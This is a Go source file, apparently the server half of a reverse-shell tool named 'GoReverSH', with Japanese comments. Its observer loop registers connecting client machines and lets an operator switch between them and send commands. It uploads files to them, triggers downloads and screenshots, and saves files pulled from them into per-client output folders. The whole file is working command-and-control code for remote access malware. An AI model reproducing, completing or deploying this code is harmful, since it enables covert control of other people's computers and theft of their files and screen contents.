package server

import (
	"context"
	"encoding/base64"
	"fmt"
	"io"
	"log"
	"os"
	"strings"
	"sync"
)

type Observer struct {
	Sender         Sender
	State          State
	Subject        <-chan Notification
	PromptViewFlag bool
	Lock           *sync.Mutex
}

//受け取った通知の種別によってメッセージの送信, あるいはメンバーの追加/削除を行います
func (observer Observer) WaitNotice(ctx context.Context) error {
	for {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
			notice := <-observer.Subject
			switch notice.Type {
			case JOIN:
				observer.State.ClientMap[notice.Client.Name] = notice.Client
				if observer.Sender.connectingClient == nil {
					observer.Sender.connectingClient = notice.Client
				}
				observer.printPrompt()

			case DEFECT:
				fmt.Println("Connection Close")
				notice.Client.Conn.Close()
				delete(observer.State.ClientMap, notice.Client.Name)
				if 0 < len(observer.State.ClientMap) {
					for _, c := range observer.State.ClientMap {
						observer.Sender.connectingClient = c
						break
					}
				}
				observer.printPrompt()

			case COMMAND:
				//stdoutしないコマンドでもプロンプトが表示されてしまう
				observer.Sender.SendMessage(notice.Command)
				observer.printPrompt()

			case MESSAGE:
				fmt.Printf("\n%s\n", notice.Output.Message)
				observer.printPrompt()

			case UPLOAD:
				fmt.Println("UPLOAD")
				commands := strings.Split(notice.Command, " ")
				observer.Sender.SendMessage(notice.Command)
				file, err := os.Open(commands[len(commands)-1])
				if err != nil {
					log.Println(err)
					break
				}

				//read
				//最終的な入れ物
				var content []byte
				//読み込むもの
				buf := make([]byte, 1024)
				//読み込む位置
				size := 0
				for {
					//ファイルを読み込む
					n, err := file.Read(buf)
					if err != nil {
						if n == 0 || err == io.EOF {
							break
						}
						log.Println(err)
						break
					}
					//content + bufの中身を一時的に保存。
					tmp := make([]byte, 0, size+n)
					tmp = append(content[:size], buf[:n]...)
					content = tmp
					size += n
				}

				file.Close()
				//fmt.Println(string(content))
				dataToBase64 := base64.StdEncoding.EncodeToString(content)
				observer.Sender.SendMessage(dataToBase64)
				observer.printPrompt()

			case DOWNLOAD:
				fmt.Println("DOWNLOAD")
				observer.Sender.SendMessage(notice.Command)
				observer.printPrompt()

			case SCREEN_SHOT:
				fmt.Println("SCREENSHOT")
				observer.Sender.SendMessage(notice.Command)
				observer.printPrompt()

			case CREATE_FILE:
				filePath := strings.Split(notice.Output.FileInfo.Name, "/")
				lastPathFromRecievedFile := strings.Join(filePath[:len(filePath)-1], "/")
				outdir := "./output/" + notice.Client.Name + "/" //config

				//dir作成
				if _, err := os.Stat(outdir + lastPathFromRecievedFile); os.IsNotExist(err) {
					if err2 := os.MkdirAll(outdir+lastPathFromRecievedFile, 0755); err2 != nil {
						log.Fatalf("Could not create the path %s", outdir+lastPathFromRecievedFile)
					}
				}

				f, err := os.Create(outdir + notice.Output.FileInfo.Name)
				if err != nil {
					log.Println(err)
					continue
				}
				_, err = f.WriteString(string(notice.Output.FileInfo.Body))
				if err != nil {
					log.Println(err)
				}
				f.Close()
				observer.printPrompt()

			case CLIST:
				for _, c := range observer.State.ClientMap {
					fmt.Println(c)
				}
				observer.printPrompt()

			case CSWITCH:
				fmt.Println("before:", observer.Sender.connectingClient)
				clientName := strings.Split(notice.Command, " ")[1]
				client, ok := observer.State.ClientMap[clientName]
				if ok {
					observer.Sender.connectingClient = client
					fmt.Println("aftre:", observer.Sender.connectingClient)
				} else {
					fmt.Println("not found")
				}
				observer.printPrompt()

			case CLEAN:
				fmt.Println("CLEAN")
				observer.printPrompt()

			default:
				log.Println(notice)
			}
		}
	}
}

func (o Observer) printPrompt() {
	if o.Sender.connectingClient != nil {
		fmt.Printf("\n[GoReverSH@%s]>", o.Sender.connectingClient.Name)
	} else {
		fmt.Println("wait...")
	}
}
